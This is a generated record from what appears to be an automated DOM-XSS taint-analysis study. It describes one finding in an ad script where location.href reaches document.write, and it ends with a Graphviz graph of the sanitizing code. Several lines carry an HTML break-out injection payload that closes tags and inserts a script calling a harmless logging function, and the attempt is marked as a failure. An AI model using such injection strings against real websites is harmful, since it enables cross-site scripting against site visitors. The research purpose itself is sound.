@@ -1,0 +1,86 @@
+// Finding: 8afb3fde-225a-411f-a771-9f8dcdc757b9
+// Finding.url: http://example438.com/?5.com%2F"></iframe></style></script></object></embed></textarea><script>taintfoxLog('1b637bd5f60748fa96723658b8d8cd04')</script><!--/*?p=3
+// Finding.parentloc: http://example438.com/?5.com%2F"></iframe></style></script></object></embed></textarea><script>taintfoxLog('1b637bd5f60748fa96723658b8d8cd04')</script><!--/*?p=3
+// Finding.domain: example438.com
+// Finding.base_domain: example438.com
+// Finding.source: location.href
+// Finding.sink: document.write
+// Sanitizer.score: 3
+// Sanitizer.name: RubiconAdServing.RubiconAd/this.start
+// Sanitizer.location: http://ads.example81.com/ad/14032.js - RubiconAdServing.RubiconAd/this.start:1:15461
+// Finding.begin: 133
+// Finding.end: 348
+// Finding.original_uuid: 71b800ef-88ef-439e-924d-ec86f08788f3
+// Finding.TwentyFiveMillionFlowsId: -1177854494
+// Finding.script: http://ads.example81.com/ad/14032.js
+// Finding.line: 1
+// Exploit.uuid: 1b637bd5-f607-48fa-9672-3658b8d8cd04
+// Exploit.success: false
+// Exploit.status: failure
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: src
+// Exploit.quote_type: "
+// Exploit.tag: script
+// Exploit.break_out: 5.com%2F"></iframe></style></script></object></embed></textarea><script>
+// Exploit.break_in: </script><!--/*
+// Exploit.payload: 5.com%2F"></iframe></style></script></object></embed></textarea><script>taintfoxLog(1)</script><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 18
+// Exploit.replace_begin_url: 19
+// Exploit.replace_end_url: 18
+// Exploit.replace_begin_param: 237
+// Exploit.replace_end_param: 245
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: true
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: 1320854108
+// DepGraph.sanitizer_hash: 760522718
+// Part of the URL ('&rf=http%3A//example438.com/%3F5.com%252F%22%3E%3C/iframe%3E%3C/style%3E%3C/script%3E%3C/object%3E%3C/embed%3E%3C/textarea%3E%3Cscript%3EtaintfoxLog%28%271b637bd5f60748fa96723658b8d8cd04%27%29%3C/script%3E%3C%21--/*%3Fp%3D3') found in right hand side of replace 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="escape"];
+n2 [shape=box, label="Var: x"];
+n3 [shape=ellipse, label="."];
+n4 [shape=box, label="Lit: &rf="];
+n5 [shape=ellipse, label="str_replace_once"];
+n6 [shape=box, label="Lit: $referrer$"];
+n7 [shape=box, label="Lit: &rf=http%3A//example438.com/%3F5.com%252F%22%3E%3C/iframe%3E%3C/style%3E%3C/script%3E%3C/object%3E%3C/embed%3E%3C/textarea%3E%3Cscript%3EtaintfoxLog%28%271b637bd5f60748fa96723658b8d8cd04%27%29%3C/script%3E%3C%21--/*%3Fp%3D3"];
+n8 [shape=box, label="Var: x"];
+n9 [shape=ellipse, label="str_replace_once"];
+n10 [shape=box, label="Lit: $aso$"];
+n11 [shape=box, label="Lit: &p_pos=btf"];
+n12 [shape=box, label="Var: x"];
+n13 [shape=box, label="Var: x"];
+n14 [shape=doubleoctagon, label="Return: x"];
+n2 -> n0;
+n1 -> n2;
+n3 -> n4;
+n3 -> n1;
+n8 -> n3;
+n5 -> n6;
+n5 -> n7;
+n5 -> n8;
+n12 -> n5;
+n9 -> n10;
+n9 -> n11;
+n9 -> n12;
+n13 -> n9;
+n14 -> n13;
+}
